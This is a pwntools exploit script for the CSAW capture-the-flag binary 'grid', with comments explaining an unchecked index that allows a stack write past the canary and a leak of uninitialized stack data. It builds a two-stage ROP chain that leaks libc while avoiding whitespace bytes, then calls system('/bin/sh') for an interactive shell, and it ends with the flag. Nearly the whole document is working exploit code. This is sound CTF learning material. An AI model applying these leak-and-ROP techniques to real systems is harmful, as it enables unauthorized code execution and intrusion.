from pwn import *

binary_path = "./grid"
lib_path = "./lib/"

elf = context.binary = ELF(binary_path)
libc = ELF(lib_path + "libc.so.6")
libstdc = ELF(lib_path + "libstdc++.so.6")

LIBSTDC_OFFSET = 0xfb5da

LIBC_OFFSET = 0x21b97

gs="""

# python
# import splitmind
# (splitmind.Mind()
#     .tell_splitter(show_titles=True)
#     .tell_splitter(set_title="gdb")
#      #.above(of="main", display="expressions", size="75%")
#      #.left(of="expressions", display="disasm", size="35%")
#     .above(of="main", display="stack", size="75%")
#     .left(of="stack", display="regs", size="66%")
#     .right(of="regs", display="disasm")
# ).build(nobanner=True)
# end

# break *0x400aa9
break *0x400bbf

continue
"""
def start():
    if args.DEBUG:
        context.log_level = "DEBUG"

    if args.REMOTE:
        # nc pwn.chal.csaw.io 5013
        return remote("pwn.chal.csaw.io", 5013)

    if args.GDB:
        context.terminal = ["tmux", "split-window", "-v", "-b", "-p", "80"]
        return gdb.debug(binary_path, gdbscript=gs, env={"LD_LIBRARY_PATH": lib_path})
    else:
        return process(binary_path, env={"LD_LIBRARY_PATH": lib_path})


def add_shape(io, name, x, y):
    io.sendline(p8(name))
    io.recvuntil("loc>")
    io.sendline(str(x))
    io.sendline(str(y))
    io.recvuntil("shape>")


def write_rop_chain(io, chain):
    assert(len(chain) <= 100)
    for i, b in enumerate(chain):
        x = 0
        y = 120 + i
        add_shape(io, b, x, y)
    io.sendline("d")


io = start()

io.clean()

# Binary assumes indices in grid are in the range 0-9, but never enforces this. This ends up
# leading to an overflow primitive that lets us write onto the stack directly, skipping over
# the stack cookie (we abuse a calculation that is meant to compute the index into a buffer). We
# have 100 bytes (don't have to be contiguouss) to write to


# Binary leaks uninitialized stack data, which contains pointers to libstdc++ and the stack
io.sendline("d")
leak = io.recvuntil("shape>")

libstdc_leak = u64(leak[0x25:0x25 + 6].ljust(8, b"\0"))
libstdc.address = libstdc_leak - LIBSTDC_OFFSET

stack_leak = u64(leak[0x2e:0x2e + 8])

# For future reference, once one lib is leaked, others probably can be as well.
# Would have been nice to know before hand, lol
libc_leak = u64(leak[37:43] + b"\0"*2) - 0x4ec5da
print(f"LIBC LEAK: {hex(libc_leak)}")

print(f"LIBSTDC ADDR: {hex(libstdc.address)}")
print(f"STACK LEAK: {hex(stack_leak)}")

# Use gadgets in libstdc++ to leak address of libc (rop chain calls the operator<< function on cout
# to print the __libc_start_main offset off of the stack). Need to be a bit clever, since we can't
# write whitespace (spaces, newlines, tabs, carrage returns, etc). Probably possible to use 
# syscall directly (writing "/bin/sh" onto the stack) instead of this multistage rop payload

POP_RDI_RET = 0x000000000008fedc
POP_RSI_RET = 0x000000000000bc50
POP_RAX_RET = 0x000000000000484c
SUB_EDI_EAX = 0x000000000012cecd
ADD_EAX = 0x00000000000b3c82 # add eax, 0x8a5de; ret;
CALL_RAX = 0x000000000006e630

rop = ROP(elf)
# First load address of std::cout (0x6020a0) into RDI. We can't write the 0x20 (space), so we pop
# 0x6030a0 and then subtract 0x001000
rop.raw(libstdc.address + POP_RDI_RET)
rop.raw(0x6030a0)
rop.raw(libstdc.address + POP_RAX_RET)
rop.raw(0x001000)
rop.raw(libstdc.address + SUB_EDI_EAX)

# Address of libc_start_main return address
rop.raw(libstdc.address + POP_RSI_RET)
rop.raw(stack_leak - 0xd8) # __libc_start_main addr

# Call operator<<(cout, __libc_start_main addr)
rop.raw(0x4008e0) # COUT STR PLT

# Return back into the loop function. We can't write the address directly (the 0x0b in the middle
# is a vertical tab), so we use a gadget that adds a static value to rax, so we can avoid the bad
# characters and call the function directly
rop.raw(libstdc.address + POP_RAX_RET)
rop.raw(0x400bc0 - 0x8a5de)
rop.raw(libstdc.address + ADD_EAX)
rop.raw(libstdc.address + CALL_RAX)

io.clean()
write_rop_chain(io, rop.chain())
leak = io.recvuntil("shape>")

libc_leak = u64(leak[-12:-6].ljust(8, b"\0"))
libc.address = libc_leak - LIBC_OFFSET

print(f"LIBC: {hex(libc.address)}")

# Now that we have the address to libc, we can call system in the normal way

binsh_addr = next(libc.search(b"/bin/sh\0"))

rop = ROP(elf)
rop.raw(libstdc.address + POP_RDI_RET)
rop.raw(binsh_addr)
rop.raw(libc.sym.system)

write_rop_chain(io, rop.chain())

io.interactive()

# flag{but_4ll_l4ngu4g3s_R_C:(}
